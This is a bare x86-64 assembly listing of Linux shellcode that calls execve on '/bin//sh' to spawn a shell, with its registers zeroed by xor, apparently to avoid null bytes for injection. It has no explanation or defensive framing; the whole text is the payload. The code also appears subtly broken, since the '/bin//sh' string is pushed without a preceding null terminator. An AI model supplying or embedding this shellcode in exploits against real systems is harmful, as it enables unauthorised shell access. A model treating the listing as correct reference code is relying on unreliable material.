section .text
    global _start

_start:
    xor     rax, rax
    mov     al, 59

    xor     rdx, rdx
    mov     rbx, 0x68732f2f6e69622f
    push    rbx
    mov     rdi, rsp

    push    rdx
    push    rdi
    mov     rsi, rsp

    xor     rdx, rdx

    syscall